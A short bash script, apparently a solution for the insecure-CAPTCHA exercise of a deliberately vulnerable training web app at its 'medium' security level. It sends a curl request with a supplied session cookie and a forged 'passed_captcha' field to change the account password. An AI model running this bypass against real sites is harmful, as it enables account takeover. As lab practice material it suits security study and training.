#!/bin/bash

phpsessid=$1
password="password"

curl -v\
	--cookie "PHPSESSID=$phpsessid; security=medium" \
	--data "step=2&password_new=$password&password_conf=$password&g-recaptcha-response=&Change=Change&passed_captcha=hacked" \
	http://172.17.0.2/vulnerabilities/captcha/

